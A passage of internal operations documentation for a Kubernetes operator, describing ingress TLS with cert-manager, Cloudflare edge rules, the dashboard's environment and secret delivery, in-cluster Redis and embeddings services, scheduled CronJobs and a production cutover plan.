`reconcileApp` (`appDef.ingressHost` and `ingressExtraHosts`), the writer and reader through
`reconcileEngineIngresses`, which also narrows the same spec into the `/metrics` deny companions. It
renders one rule for `host`, then one per extra host in stored order, each with the same Prefix `/`
path to the same Service and port, on `spec.components.ingressClassName`, with TLS from
`originTLS`; `upsertIngress` then calls `applyIngressTLS` (below) so every rule host gets a
certificate. The rule list is built fresh and replaced on each reconcile, so
a removed extra loses its rule and TLS entry, and an unchanged CR writes nothing.

Extra hosts are aliases only: DNS (`reconcilePublicDNS`) reads `host` alone, so an extra never gets a
`CloudflareDNSRecord`. `validateIngressHosts` runs first in `Reconcile`, before the network sandbox
and every component step: an extra host without `host`, an empty or over-253-character extra, or a
name repeated (case-insensitively) across the `host` and `extraHosts` of dashboard, docs,
oramasearchApp, engine.writer and engine.reader, in that order and enabled or not, sets `Degraded`
with `Ready=False` reason `InvalidIngressHosts` naming both fields, writes nothing else and does not
requeue. `oramasearchApp` takes part in the check but its reconciler stays unwired, so its hosts
never reach an Ingress. Field reference: [`crd-reference.md`](crd-reference.md#extra-hosts-extrahosts).

### Origin TLS (`ingress_tls.go`, [#457](https://github.com/oramasearch/orama-operator/issues/457))

Every Ingress a Cloud v1 stack renders is encrypted to the origin with a certificate cert-manager
issues and renews (decision 5 of the 2026-10-16 decisions page in orama-bridge). Lake, Lake app,
environment and public Zetta Ingresses have the same since
[#578](https://github.com/oramasearch/orama-operator/issues/578), with the Lake's zone secured by the
operator (`EdgeZonePolicy`); see [Lake origin TLS](#lake-origin-tls-lake_origin_tlsgo-578) below.

- **One `Issuer` per stack.** The step `originTLS` keeps a namespaced cert-manager `Issuer`
  `<cr>-letsencrypt` (Let's Encrypt production, DNS-01 through Cloudflare), owned by the stack. Its
  solver uses the stack's `spec.cloudflare.apiTokenSecretRef` Secret, key `token`; cert-manager
  generates the ACME account key into `<cr>-letsencrypt-account`. No token, no `Issuer`. cert-manager
  itself is the platform release every cluster already runs; no new chart.
- **One shared function.** Each Ingress builder calls `applyIngressTLS(ing, issuer)` last in its
  `CreateOrUpdate` mutation, with the issuer from `stackIngressIssuer(oc)`. It adds one TLS entry
  per distinct rule host, each with its own Secret `ingressTLSSecretName(host)` (`<host>-tls`;
  `*` becomes `wildcard`; a name over 253 characters is cut to 240 plus 8 hex characters of the
  host's SHA-256), sets `cert-manager.io/issuer` and `nginx.ingress.kubernetes.io/ssl-redirect:
  "true"`, keeps every other annotation and removes `cluster-issuer`, `issuer-kind` and
  `issuer-group`. cert-manager's ingress-shim creates one `Certificate` per entry; the operator never
  writes the `Certificate` or its Secret.
- **No HTTP-only fallback.** A stack with a host but no Cloudflare token fails the reconcile
  (`Degraded`, `ReconcileError`, the message names `spec.cloudflare.apiTokenSecretRef`) and leaves
  any existing Ingress as it is. An empty rule list, an empty host or an empty issuer is an error.
- **One Secret per host.** The Secret name depends only on the host, so another Ingress serving the
  same host (the `/metrics` deny companions, [#410](https://github.com/oramasearch/orama-operator/pull/410))
  names the same Secret. The companions copy their main Ingress's TLS entries (`originTLS`) without
  `applyIngressTLS`'s annotations, so cert-manager issues one certificate per host, for the main
  Ingress only. Removing a host drops its TLS entry; the other hosts keep their Secrets.
- **Known gap:** decision 5 gives each stack its own ingress-nginx. The operator does not render one
  yet ([#573](https://github.com/oramasearch/orama-operator/issues/573)), so a stack's Ingresses
  still use `spec.components.ingressClassName` (default the platform's `nginx`). TLS renders on
  whichever class the Ingress has.
- **Cloudflare.** The zones' SSL mode is never changed (decision 15 of 2026-10-17): the zones carry
  Prod 1's hosts. Full (strict) and the HTTP to HTTPS redirect are per host, declared by an
  `EdgeHostPolicy` ([#527](https://github.com/oramasearch/orama-operator/issues/527), below) as
  Cloudflare rules the operator applies, never a rule set by hand. Wiring the Cloud v1 hosts into one,
  each host only once its certificate is ready, is
  [#528](https://github.com/oramasearch/orama-operator/issues/528).

### Per-host edge rules (`edgehostpolicy_controller.go`, `cloudflarehostpolicy_controller.go`, [#527](https://github.com/oramasearch/orama-operator/issues/527))

- **`EdgeHostPolicyReconciler`** resolves the `EdgeProvider` and keeps an owned `CloudflareHostPolicy`
  of the same name (hosts, flags, the provider's account and token, the rule ref prefix
  `orama-operator-<namespace>-<name>`), and copies its readiness back. It calls no vendor.
- **`CloudflareHostPolicyReconciler`** groups the hosts by zone (longest suffix that is a zone the
  token can read), and in each zone keeps at most two rules identified by ref: `<prefix>-tls` in
  `http_config_settings` (`set_config` `ssl: strict`, appended last) and `<prefix>-https` in
  `http_request_dynamic_redirect` (301 to HTTPS, inserted first). It creates a phase entrypoint only
  when the zone has none, never `PUT`s an existing one, patches our rule only when it differs, deletes
  it by ID only while its ref is ours, and reports (never moves) another rule that would override ours.
  Its finalizer removes our rules on deletion; it rechecks every ten minutes. Contract:
  [`crd-reference.md`](crd-reference.md#cloudflarehostpolicy-separate-crd-namespaced--an-edgehostpolicy-applied-as-cloudflare-rules).

### Lake origin TLS (`lake_origin_tls.go`, [#578](https://github.com/oramasearch/orama-operator/issues/578))

The contract is [`lake/origin-tls.md`](lake/origin-tls.md). What the reconcilers create:

- **`LakeReconciler`**: always the `Issuer` `lake-<name>-letsencrypt`, its solver chosen per host
  ([#632](https://github.com/oramasearch/orama-operator/issues/632)): DNS-01 through the
  `dnsSecretRef` Secret's `token` for names in its zone (`EdgeZonePolicy` `status.zone`), HTTP-01
  through the Lake's ingress class for any other name, and HTTP-01 alone without a `dnsSecretRef`.
  With a `dnsSecretRef`, also an owned `EdgeProvider` and `EdgeZonePolicy` `lake-<name>-edge` for the
  Secret's `zoneID`. Its Ingress `lake-<name>` gets `applyIngressTLS` for `host` and `apexHost` (or the
  hand-supplied `spec.tls.secretName`). Two more Ingresses, `lake-<name>-apps-wildcard` and
  `lake-<name>-preview-wildcard`, request the wildcard certificates and answer unknown names with a
  permanent redirect to the Lake's host; they exist only with a `dnsSecretRef` (wildcards need DNS-01).
- **`LakeAppReconciler`, `LakeEnvironmentReconciler`**: each host's certificate is issued in the Lake
  namespace (the wildcard's, or a `Certificate` `<host>-tls` owned by the app or environment) and
  copied next to the Ingress in the workspace namespace; the copies follow renewals and are removed
  with the host or the workload. A preview host no preview wildcard covers is not issued
  (`lakeIssuableHosts`).
- **Every Lake Ingress** takes `ssl-redirect` and the client-certificate requirement from the
  `EdgeZonePolicy` status (`applyLakeEdgeAnnotations`): the redirect only when the edge reaches the
  origin over TLS and has a certificate for every host of the Ingress; the requirement
  (`auth-tls-secret` naming `<ingress>-edge-client-ca`) only once the zone has authenticated origin
  pulls on.
- **`EdgeZonePolicyReconciler`** creates the owned `CloudflareZonePolicy` and copies its status;
  **`CloudflareZonePolicyReconciler`** reads the zone and its proxied records every ten minutes, probes
  each host's origin and edge, reports the zone's name (`status.zone`), and turns on Full, Full (strict), authenticated origin pulls and Always
  Use HTTPS in that order, each when its check passes. It never turns one off.
- **`OramaZettaClusterReconciler`**: a public Zetta's Ingress gets its own `Issuer` `<name>-letsencrypt`
  from its `dnsSecretRef` and `applyIngressTLS`; without a `dnsSecretRef` the reconcile fails.

**Validated on AKS (2026-07-08):** a CR with these enabled produced the 5 Deployments,
the Mongo StatefulSet, the dashboard Ingress, and 6 Services; CR-delete GC'd them.

> **Follow-ups:** images for `index-builder` / `harvest` / `dashboard` / the `workers`
> bundle are **placeholders** (`oramasearch/<name>:latest`) pending published/built
> images — override via `spec.images.overrides`. HARVEST's Podman-per-job worker model
> needs porting to k8s Jobs (the master + Mongo + Selenium are here; the job spawner
> is a follow-up). index-builder needs its env + secret wiring (control-plane DB URL, API keys)
> via the component secret.

### The dashboard's derived values ([#572](https://github.com/oramasearch/orama-operator/issues/572))

Three dashboard variables follow from what the operator already knows, so it sets them as explicit
env entries instead of a copied Secret or a hand-written `dashboard.env`:

| Variable | Value | When |
|---|---|---|
| `NEXT_PUBLIC_APP_URL` | `https://<components.dashboard.host>`, never an extra host | `dashboard.host` is set |
| `ORAMACORE_PLACEMENT_CLUSTER_ID` | the `c1` row's id the cluster-row Job recorded ([above](#controldb-internalcontrollercontroldbgo)) | the Job has recorded a live `c1` row |
| `REDIS_CACHE_URL` | `http://<cr>-redis-http` ([#562](#the-upstash-rest-shim-redis_httpgo-562)) | the cache runs in this cluster |

An explicit env entry wins over `envFrom`, so a value left in a `dashboard.envFrom` source (for example
`v1-prod-dashboard-env`) is ignored; `dashboard.env` still replaces them. `NEXT_PUBLIC_APP_URL` takes
effect at runtime only when the dashboard image was built **without** it: `next build` inlines a
`NEXT_PUBLIC_*` value set at build time into every bundle, server code included. Every production read
of it is server code (route handlers, `invitations.ts`, `middleware.ts`), so no per-host build is
needed. A changed `dashboard.host` changes the value and rolls the dashboard.

### The dashboard's environment

Prod 1's dashboard runs with Vercel variables the operator does not own: Stripe, S3, Slack, Resend,
the cron and private-API secrets and others. `spec.components.dashboard.envFrom` and `.env`
([operator#311](https://github.com/oramasearch/orama-operator/issues/311)) take them from Secrets and
ConfigMaps in the instance's namespace. The full field reference is in
[crd-reference.md](crd-reference.md#speccomponentsdashboard); in short (`dashboard_env.go`):

- **Precedence**, lowest to highest: the operator's envFrom, `dashboard.envFrom` (a later source wins),
  the operator's explicit env, `dashboard.env` (one entry per name, the last wins).
- **Refused**: `DATABASE_URL`, `POSTGRES_HOST`, `POSTGRES_PORT`, `POSTGRES_DB`, `POSTGRES_PASSWORD`,
  `JWT_PRIVATE_KEY`, `JWT_PUBLIC_KEY`, `JWT_ISSUER` and `MASTER_API_KEY` (the control DB, `<cr>-jwt`, the JWT issuer and `spec.masterAPIKeySecretRef` own
  them), in `env` or as any key of an `envFrom` source after its prefix. The reconcile fails
  with `Ready=False`, naming the field, the object and the variable, never the value.
- **Missing references** fail the reconcile the same way unless `optional: true`. The check runs before
  the Deployment is written, so the running dashboard keeps its last valid template.
- **Rolling**: the controller watches every referenced Secret and ConfigMap, owned or not, and the pod
  template carries `orama.cloud/dashboard-env-hash` over the referenced data, so a changed key rolls
  the dashboard with no restart by hand. Without a Secret or ConfigMap reference there is no
  `dashboard-env-hash` annotation and the template is unchanged; the master key's
  `orama.cloud/credentials-hash` ([#307](https://github.com/oramasearch/orama-operator/issues/307)) is
  there either way.

**How the Secret reaches the clusters.** Nothing is created by hand in a member namespace.

- The dashboard's environment Secret (`v1-prod-dashboard-env` for `v1-prod`) exists **once, on the
  managing cluster** (`orama-production-cluster-01`, namespace `orama-system`, beside the set's other
  sources).
- Each member receives it through the `OramaCloudV1Set`'s `spec.secrets` list, which copies each named
  Secret into every member's namespace before the instance, and again on every reconcile of the set.
  The set's template references it in `components.dashboard.envFrom`. A `spec.secrets` entry has
  `name`, `namespace` and an optional `as` (its name on the member); it is not a `secretRef`. A
  member's own `spec.clusters[].secrets` entry replaces a set entry with the same destination name.
  Recommendation and per-key detail: orama-bridge
  [`docs/projects/orama-cloud-v1/secrets.md`](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/secrets.md).
- The set does not watch its source Secrets. A change on the managing cluster reaches the members at
  the set's next reconcile (every 15 seconds while settling, five minutes when steady); the member's
  dashboard watch then sees the copied Secret and rolls the dashboard. ConfigMaps work as local
  references, but the set's `secrets` list copies only Secrets.
- These are **Orama's own platform secrets** (Stripe, Resend, Slack and the rest). They never go into
  a customer's store or a workspace secret store.
- Creating or changing that Secret on the managing cluster is a write there, so it is **asked of Steve
  first**, each time, the test Secret for a proof included. A `kubectl create secret` in `v1-dev`,
  `v1-eu` or `v1-us` is forbidden by the cluster rules.
- Only third-party keys and values that must equal Prod 1's are copied this way. A key that only has
  to agree inside the stack is generated by the operator, not copied; stack-local URLs and IDs go in
  the set's `dashboard.env`. Never list the generated Secrets (`<cr>-jwt`, the database, broker and
  cache credentials) in the set's `secrets`.

`config/clusters/sets/v1-nonprod.yaml` carries the delivery (`spec.template` is the instance spec
itself). The source Secret `orama-system/v1-nonprod-dashboard-env` must exist on the managing cluster,
created with Steve's consent, before the file is applied:

```yaml
spec:
  secrets:
    - name: v1-nonprod-dashboard-env
      namespace: orama-system
  template:
    components:
      dashboard:
        envFrom:
          - secretRef:
              name: v1-nonprod-dashboard-env
```

The copy is then Secret `v1-dev/v1-nonprod-dashboard-env` on `orama-nonprod-cluster-01`. The
`v1-prod` entry and reference land with
[operator#445](https://github.com/oramasearch/orama-operator/issues/445).

**Environment inventory.** What the dashboard (`cloud-migration`) reads beyond the operator's own
variables. This records what the code reads; it does not approve copying every value or keeping every
outside service. Per-key sources, and whether each must equal Prod 1, are in the bridge's
`secrets.md`; production assignments are #445's work.

`PRIVATE_API_KEY`, `STRIPE_WEBHOOK_SECRET`, `STRIPE_SECRET_KEY`, `S3_BUCKET`, `S3_BUCKET_REGION`, `S3_BUCKET_PREFIX`, `AWS_ACCESS_KEY_VALUE`,
`AWS_SECRET_ACCESS_KEY_VALUE`, `REDIS_CACHE_URL`, `REDIS_CACHE_TOKEN`, `RESEND_API_KEY`, `SLACK_TOKEN`,
`SLACK_CHANNEL_NEW_USERS`, `SLACK_CHANNEL_STRIPE`, `DATA_SOURCE_REQUEST_URL`, `NEXT_PUBLIC_APP_URL`,
`ORAMACORE_PLACEMENT_CLUSTER_ID`.

- The dashboard's `AIRBYTE_*` keys are left out: they go away with Airbyte (bridge decisions of
  2026-10-16, 12a) and are not copied.
- `CRON_SECRET` reaches the dashboard through `dashboard.envFrom`, and the in-cluster CronJobs
  ([operator#17](https://github.com/oramasearch/orama-operator/issues/17)) read it from the same
  Secret key, resolved from the dashboard's own `envFrom` and `env`, so there is no second reference
  to keep in step. Only the dashboard and those CronJobs share it, so its value is new for Prod 2, not
  copied from Prod 1, and it lives in the environment Secret the set delivers.
- No Firebase keys: sign-in moves to Clerk before the cutover and Prod 2 needs no Firebase server
  keys (bridge decisions of 2026-10-16, 1 and 2). Clerk's keys are added with orama-bridge#180.
- `NEXT_PUBLIC_APP_URL`, `ORAMACORE_PLACEMENT_CLUSTER_ID` and `REDIS_CACHE_URL` are set by the
  operator ([derived values](#the-dashboards-derived-values-572)); the image must be built without
  `NEXT_PUBLIC_APP_URL`, which is checked on the image. `SLACK_SIGNUP_APP_URL`, `INTERNAL_APP_URL` and
  `CRON_FORWARD_ORIGIN` are optional settings the dashboard also reads.
- **Prerequisites recorded, not solved here.** Analytics use the in-cluster ClickHouse, with no copied
  `CLICKHOUSE_*` key. The dashboard's `runClickhouse` (`src/lib/clickhouse/index.ts`) posts JSON
  `{sql, queryVariables}` with Basic auth to a URL, while the operator gives it a bare service name in
  `CLICKHOUSE_HOST` and a placeholder `CLICKHOUSE_PASSWORD`; nothing here makes that connection work.
  `REDIS_CACHE_URL`/`REDIS_CACHE_TOKEN` feed `@upstash/redis` over HTTP (`src/lib/redis/redis.ts`),
  not the in-cluster Redis TCP service. Where the cache runs, the operator sets both to the in-stack
  `serverless-redis-http` shim ([below](#the-upstash-rest-shim-redis_httpgo-562)); a value the set
  delivers through `dashboard.envFrom` is shadowed by them, and `dashboard.env` still wins. Rendering
  the ClickHouse variables does not prove that integration works.

### The Upstash REST shim (`redis_http.go`, [#562](https://github.com/oramasearch/orama-operator/issues/562))

Prod 1's dashboard caches analytics query results (`analytics/search-get-body`,
`analytics/conversations-get-body`) in Upstash Redis through its REST API. Upstash comes into the
cluster (bridge decisions of 2026-10-16, 12a) and the dashboard is not changed: the operator runs
[`serverless-redis-http`](https://github.com/hiett/serverless-redis-http), which speaks Upstash's REST
protocol, in front of the stack's own Redis (bridge decisions of 2026-10-17, 7).

- **When.** Whenever the cache runs in this cluster (enabled, not `mode: external`, not
  `placement: central` on a read region). No toggle of its own; disabling the cache removes the
  Deployment and Service and keeps the token.
- **Token.** `<cr>-redis-http`, key `token`: 64 hex characters (32 random bytes), generated once by
  the bootstrap step like the other [credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo),
  never rotated by the reconcile and never removed by a teardown.
- **Deployment and Service** `<cr>-redis-http`, port 80, one replica, `64Mi`/`50m` requested and a
  `256Mi` limit, with `NET_BIND_SERVICE` for port 80. Env, in order: `REDIS_PASSWORD` from
  `<cr>-cache-auth`, `SRH_MODE=env`, `SRH_TOKEN` from `<cr>-redis-http`, and
  `SRH_CONNECTION_STRING=redis://:$(REDIS_PASSWORD)@<cr>-cache:6379`. Probes are TCP on 80 (the shim
  answers `GET /` but has no health route). A changed token or Redis password rolls it.
- **Image.** `oramasearch/serverless-redis-http@sha256:65128347949bca511e448fd7238780d624573d74c22b79155a7563db19e9b678`:
  upstream `hiett/serverless-redis-http:0.0.10` (that index digest; `linux/amd64` and `linux/arm64`),
  copied without a rebuild into a private Docker Hub repository, so the digest does not change, and
  pulled with `spec.images.pullSecretName`. `spec.images.overrides["redis-http"]` replaces it.
- **Dashboard.** `REDIS_CACHE_URL=http://<cr>-redis-http` and `REDIS_CACHE_TOKEN` from
  `<cr>-redis-http` key `token`; the token's hash is on the dashboard's template, so a new token rolls
  it.
- **Network.** Only the dashboard reaches the shim, on 80 (`allow-redis-http-ingress`, and port 80 in
  `allow-dashboard-egress`); the shim reaches only the cache, on 6379 (`allow-redis-http-egress`,
  and `redis-http` in `allow-cache-ingress`).
- **Other Upstash REST users.** `secure-proxy` and `worker-answer-engine` import `@upstash/redis`, but
  neither runs in the cluster: the `orama-workers` bundle (`build/images/workers` in the Cloud v1
  bridge) mounts no worker's code yet and reads no Upstash variable, so the workers get no path to the
  shim. Wire it when a worker that uses Upstash is mounted.
- **Protocol.** The shim implements the request-body form `@upstash/redis` uses (`POST /`,
  `/pipeline`, `/multi-exec` with `Authorization: Bearer <token>`), not command paths such as
  `/set/<key>/<value>`. A probe by hand is
  `curl -s -H "Authorization: Bearer $REDIS_CACHE_TOKEN" -H 'Content-Type: application/json' -d '["SET","probe","1"]' $REDIS_CACHE_URL`.

### HPES, index-builder's embeddings (`hpes.go`, [#574](https://github.com/oramasearch/orama-operator/issues/574))

index-builder embeds documents through HPES (`embeddings-server-py`); Prod 1 calls it at
`ai.orama.run`. The stack runs its own (bridge decisions of 2026-10-16, 3, and 2026-10-17, 5 and 9).
It is not the engine's embeddings sidecar (`<cr>-embeddings`, `oramacore-ai-server`), which is a
different program and is unchanged.

- **When.** Whenever ingestion runs. No toggle of its own; disabling ingestion removes the
  Deployment and Service and keeps the bearer.
- **Bearer.** `<cr>-hpes`, key `token`: 64 hex characters (32 random bytes), generated once by the
  bootstrap step like the other [credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo),
  never rotated by the reconcile and never removed by a teardown. HPES reads it as `API_KEY`;
  index-builder sends it as `ORAMA_EMBEDDINGS_BEARER`. Both are explicit `secretKeyRef` entries, and
  both carry the Secret in their credentials hash, so a new value rolls both. `<cr>-index-builder-secret`
  no longer seeds the `dev-hpes-bearer` placeholder; a value an older Secret still holds is shadowed.
- **Deployment and Service** `<cr>-hpes`, port 8787, one replica, ClusterIP, no Ingress, no DNS
  record and no public host. CPU only, on the stack's ordinary nodes: no GPU request, node selector
  or toleration. Default resources 7Gi and 2 CPUs requested with a 10Gi limit, sized for the six
  models of the `all` group (bge small, base and large; multilingual-e5 small, base and large: about
  1.4 billion float32 parameters, ~5.7 GB loaded); `ingestion.hpesResources` replaces them. Env:
  `API_KEY`, `EXECUTION_PROVIDERS=CPUExecutionProvider`, `MODELS_GROUP=all` (Prod 1's unit loads
  `all`, so every model a copied index names is there), `HOST=0.0.0.0`, `HTTP_PORT=8787`,
  `TOTAL_THREADS=4` (matched to the CPU request; the server requires an even value). The server's
  gRPC listener (50051) starts but is not exposed.
- **Probes** are TCP on 8787. The server checks the bearer on every route, `/health` included, so an
  HTTP probe would need the bearer in the pod spec; it loads every model before it listens, so an
  open port means the models are loaded.
- **Image.** `componentImage(oc, "hpes", "embeddings-server-py")`: `spec.images.overrides["hpes"]`
  wins, and production pins `oramasearch/embeddings-server-py:cpu-<sha>` by digest there. That image is
  built by [embeddings-server-py#9](https://github.com/oramasearch/embeddings-server-py/issues/9) with
  its models cached at build time, so the pod downloads nothing at start.
- **index-builder.** `ORAMA_EMBEDDINGS_URL=http://<cr>-hpes:8787/v1/embeddings_b64`. Its client
  (index-manager `apps/index-builder/src/embeddings/oramaai.ts`, `fetchEmbeddings`) posts to the URL
  exactly as given and decodes base64 float32 vectors when the URL ends in `_b64`; the server's
  `/v1/embeddings_b64` answers `{embeddings, dimensions}`, which is the shape the client reads. The
  bare `/v1/embeddings` answers an OpenAI-shaped `{data: [...]}` the client does not read. It
  replaces the old `http://<cr>-disco:50051`, which pointed at DISCO, a component `v1-prod` disables.
- **Network.** Only index-builder reaches HPES, on 8787 (`allow-hpes-ingress`, and HPES in
  `allow-index-builder-egress`). HPES has no egress allowance beyond the stack-wide DNS rule and no
  public-internet allowance.

### The dashboard's scheduled jobs

`spec.components.dashboard.crons` ([operator#17](https://github.com/oramasearch/orama-operator/issues/17),
`dashboard_crons.go`) runs Prod 1's scheduled jobs as CronJobs owned by the `OramaCloudV1`. Without
the dashboard's three, the crawler that drives ingestion, the index GC and the Stripe usage sync never
run on Prod 2. Running them on both stacks at once would crawl and bill twice, so every one is created
suspended. Field reference: [crd-reference.md](crd-reference.md#speccomponentsdashboardcrons).

- **Dashboard crons.** `<cr>-dashboard-cron-crawler` (`*/1 * * * *`), `-index-gc` (`0 * * * *`) and
  `-consumption-sync` (`0 */6 * * *`), Prod 1's schedules from the dashboard's `vercel.json`, fixed.
  Each Job runs `curlimages/curl:8.10.1` (or `spec.images.overrides["dashboard-crons"]`, used as
  written) and sends `GET http://<cr>-dashboard:3000<path>` with `Authorization: Bearer $CRON_SECRET`.
  The in-cluster Service means a run cannot reach Prod 1 while DNS moves. The header reaches curl on
  stdin, so the value is in no argument, and only the HTTP status is logged, never the body. Any status
  outside 200–299 fails the Job, a redirect included (it is never followed), as do connection errors
  and the 300-second timeout. `consumption-sync` only queues per-team usage syncs: its 2xx proves the
  call, not every queued payment update.
- **E2E canary.** `<cr>-e2e-canary` (`*/5 * * * *`) runs `monitor-test` from the digest-pinned
  `e2eCanary.image`: it signs in through `http://<cr>-dashboard:3000/api/user/jwt` with the canary
  project's private API key, inserts a probe document, checks it through the readers the dashboard
  returns and the in-cluster `<cr>-reader`, and deletes the oldest tracked probe. In the same pod, once
  a day (the first run at or after 04:30 UTC, or after a missed day), the prune deletes leaked
  `monitor <hex>` probes once the collection holds more than 200 documents, keeping the titles the
  canary tracks; with no tracked titles it refuses to prune. The script is
  `internal/controller/assets/e2e-canary.sh`, a port of Prod 1's `collection_prune-crons.sh`. Canary
  and prune share the canary's state file, `test-state.json`, on the owned claim
  `<cr>-e2e-canary-state` (1 GiB, `ReadWriteOnce`). They run as one CronJob so that a prune can never
  delete a probe the canary has written but not yet recorded. The prune stays until the canary's leak is
  fixed in `oramacore-test-e2e` (bridge decision 11), then goes.
- **Metrics and alerts.** The canary and prune write Prometheus textfile metrics
  (`oramacore_monitor_*`, `oramacore_collection_prune_*`, the names Prod 1's alerts use) to
  `metrics/` on the state claim. Nothing scrapes them yet: collecting them and the alert rules are
  in-cluster observability's work ([#15](https://github.com/oramasearch/orama-operator/issues/15)).
  A failed run also fails its Job, which `kube_job_status_failed` reports.
- **Run policy, all four.** `timeZone: Etc/UTC`, `concurrencyPolicy: Forbid` (per CronJob; the
  dashboard's three routes can run at once), `startingDeadlineSeconds: 60` so a long suspension leaves
  no backlog, one successful and three failed Jobs kept, `backoffLimit: 0` (no retry of calls with paid
  side effects), `ttlSecondsAfterFinished: 3600`, and `activeDeadlineSeconds` 330 for the dashboard
  crons and 900 for the canary (Prod 1's prune allowed 600 seconds). Pods use the stack's pull
  secret, no service account token, the hardening baseline plus `runAsNonRoot` (uid 100, curl's
  `curl_user`, for the dashboard crons; 65532 for the canary, whose image runs as root) and a read-only
  root filesystem.
- **Ownership.** Each CronJob and the claim carry `labelsFor(cr, "dashboard-crons" | "e2e-canary")` and
  the CR as controller. A same-name object the CR does not control is a reconcile error and is left
  unchanged. Disabling the crons or the dashboard, or removing `e2eCanary`, deletes only objects the
  CR controls, before the environment is checked, so missing credentials never keep disabled crons
  alive. Deleting a CronJob removes its Jobs.

**Cutover.** `suspend` changes only through a committed change to the set file
`config/clusters/sets/v1-prod.yaml` (member `v1-eu`; `v1-us` never runs the crons), applied to the
managing cluster `orama-production-cluster-01`, never by editing, patching or creating the CronJobs.
The cutover runbook turns Prod 1's Vercel crons off at step 1 and stops Prod 1's crons host timers at
step 2 (they call `app.orama.com/api/user/jwt` and would write to Prod 2), and resumes Prod 2's
CronJobs at step 5, after `app.orama.com` points at Prod 2 (step 4): the crawler reports to
`${NEXT_PUBLIC_APP_URL}/api/private/v1/update-crawl-status`, which is `app.orama.com`, so started
earlier its results would reach Prod 1. No crawl runs between steps 1 and 5; that gap is accepted.
The canary follows the same `suspend`, so it resumes with the dashboard crons. Rollback commits `suspend: true`
first and waits for active Jobs to finish. The runbook is orama-bridge
[`docs/projects/orama-cloud-v1/cutover-runbook.md`](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/cutover-runbook.md)
(preconditions P6 and P7, branch `cutover/v1-eu-crons`).

**Prod 1's AWS crons host.** Every job known to run on `prod-oramacore-crons-us-east-2`
(`i-0bc49126a30b3a699`, `t3.medium`, us-east-2; oramacore-aws `terraform/live/prod/main.tf:620-630`),
from read-only sources: oramacore-aws `addcf3c` (2026-10-13), orama-deploy `655f1a2` (2026-06-09), the
techops-docs fleet evidence of 2026-07-07 and bridge decision 11 (2026-10-16). The host itself has not
been read; the live listing (`systemctl list-timers --all`, `systemctl list-units --all --type=service`,
each user's `crontab -l`, `/etc/crontab`, `/etc/cron.d`, `/etc/cron.*`) is still to be taken over SSM.

| Job | Schedule on Prod 1 | Source | What it does | Prod 2 |
|---|---|---|---|---|
| `oramacore.test-e2e.timer` → `.service` (user `test-e2e`, binary `monitor-e2e` from the `monitor-test` release asset) | `OnBootSec=1min`, `OnUnitActiveSec=5min`, `Persistent=false` | orama-deploy `oramacore-test-e2e/production/`, `oramacore-test-e2e.production.json` | The canary above, against collection `790cea05`, with the CF worker, the AWS load balancer and the three regional readers as extra readers; state in `test-state.json`, metrics through node_exporter | Moved: `<cr>-e2e-canary`, `*/5 * * * *` (decision 11) |
| `collection-prune.timer` → `.service` (root) | `OnCalendar=*-*-* 04:30:00 UTC`, `Persistent=true`, `OnBootSec=10min`, `TimeoutSec=600` | oramacore-aws `terraform/scripts/oramacore-custom-metrics/collection_prune-crons.sh` | The prune above | Moved into `<cr>-e2e-canary`'s daily run until the canary's leak is fixed, then dropped (decision 11) |
| `collection-doc-count.timer` → `.service` | `OnBootSec=3min`, `OnUnitActiveSec=30min` | `collection_doc_count-crons.sh` | Exports the canary collection's document count, which warns at 400 of the 500-document cap | Dropped: the prune keeps the collection under the cap (decision 11) |
| `analytics-processor.check-env.timer` | `OnUnitActiveSec=4min` | orama-deploy `analytics.production.json`, `analytics/prod/systemd/` | Analytics processor environment check | Not in this change. Decision 11 names only the canary's three timers, so Steve's decision for this row is pending ([#576](https://github.com/oramasearch/orama-operator/issues/576)) |
| `analytics-processor.importer.timer` | `OnUnitActiveSec=5min` | as above | Analytics import | Moved: `<cr>-analytics-import` runs `POST /import` every five minutes ([#421](https://github.com/oramasearch/orama-operator/pull/421), parity) |
| `analytics-processor.aggregator.timer` | `OnUnitActiveSec=5min` | as above | Analytics aggregation | Moved: the same Job runs `POST /aggregate2`, the aggregator binary's code, after each import ([#421](https://github.com/oramasearch/orama-operator/pull/421), parity; [#576](https://github.com/oramasearch/orama-operator/issues/576)) |
| CloudWatch agent, SSM agent (from `user_data`), Grafana Alloy and node_exporter | daemons, not schedules | oramacore-aws `terraform/modules/orama-crons/main.tf`, the scripts' headers | Host metrics and shipping, remote shell | Dropped with the host: Prod 2's monitoring is in-cluster ([#15](https://github.com/oramasearch/orama-operator/issues/15)) |

## Import consumer (`import_consumer.go`, [#446](https://github.com/oramasearch/orama-operator/issues/446))

`spec.components.importConsumer` runs `<cr>-import-consumer`, a Deployment of
`oramasearch/airbyte-fargate-consumer` in its queue-worker mode (`run -A src/sqs-worker.ts`). It
replaces Prod 1's EventBridge rule and Fargate task per object: the worker long-polls an SQS queue fed
by the import bucket's object-created events and runs the consumer's unchanged one-object import for
each, against this stack's dashboard (`http://<cr>-dashboard:3000`) with the dashboard's own
`PRIVATE_API_KEY` as `x-api-key`, and writes to the engine with the project write key from
get-source. AWS credentials come from `awsCredentialsSecretRef`; the queue, the event delivery and
the IAM user are AWS resources the operator does not create. Off by default and the last step of the
reconcile. Network: `allow-import-consumer-egress` (dashboard 3000), `allow-dashboard-import-consumer-ingress`
and `allow-import-consumer-public-https` (SQS, S3 and the public writer host on 443). Field reference:
[crd-reference.md](crd-reference.md#speccomponentsimportconsumer); design, the AWS prerequisites and
the switch: [cloud-v1-import-consumer.md](cloud-v1-import-consumer.md).

## Analytics import (`gaps.go`)

Each reader logs search events and serves them once through `GET /v1/analytics`, which returns
and erases them. analytics-processor's `POST /import` reads every source in its config and writes
the events to the in-cluster ClickHouse; nothing else may call the export, so the functional e2e
suite does not ([#315](https://github.com/oramasearch/orama-operator/issues/315)).

- **Sources.** `oramacores` lists reader ordinals `0..replicas-1`, each once, where `replicas` is
  `engine.reader.replicas` (0 or unset → 3), the same number the reader StatefulSet uses. Entry
  `n` is `name: <cr>-reader-<n>`,
  `api_url: http://<cr>-reader-<n>.<cr>-reader-headless.<ns>.svc:8080/v1/analytics`, the analytics
  key and `enabled: true`. There is no writer entry (the writer has no reader side) and no entry
  for the load-balanced `<cr>-reader`, which would drain whichever reader it reached. The list
  comes from the spec, never the live pods or claims, and is the same whether the import is
  enabled, disabled or suspended. The processor Deployment's `orama.cloud/config-hash` is the
